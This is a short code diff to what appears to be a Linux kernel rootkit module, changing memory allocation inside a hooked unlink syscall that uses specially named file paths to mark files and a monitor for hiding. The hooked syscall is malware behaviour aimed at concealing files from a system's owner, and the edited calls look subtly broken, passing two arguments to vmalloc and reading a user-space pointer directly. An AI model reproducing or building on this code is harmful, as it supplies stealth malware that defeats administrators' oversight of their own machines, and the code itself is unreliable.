@@ -4,6 +4,7 @@
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
 #include <linux/string.h> 
+#include <linux/vmalloc.h>
 
 /*************** Module description ********************/
 MODULE_LICENSE("GPL");
@@ -143,7 +144,7 @@ asmlinkage long hooked_unlink(const char __user *filename){
     
     //Hide a new type of file
     if(strncmp(filename, INEXISTFILE, strlen(INEXISTFILE)) == 0){
-        value = (char*) malloc(strlen(INEXISTFILE), sizeof(char*));
+        value = (char*) vmalloc(strlen(INEXISTFILE), sizeof(char*));
         for(i=0, j=-1; i<strlen(filename); i++){
             if(j>-1){
                 value[j] = filename[i];
@@ -159,7 +160,7 @@ asmlinkage long hooked_unlink(const char __user *filename){
         }
         printk("hide %s\n", value);
     } else if(strncmp(filename, INEXISTMONITOR, strlen(INEXISTMONITOR)) == 0){
-        value = (char*) malloc(strlen(INEXISTMONITOR), sizeof(char*));
+        value = (char*) vmalloc(strlen(INEXISTMONITOR), sizeof(char*));
         for(i=0, j=-1; i<strlen(filename); i++){
             if(j>-1){
                 value[j] = filename[i];
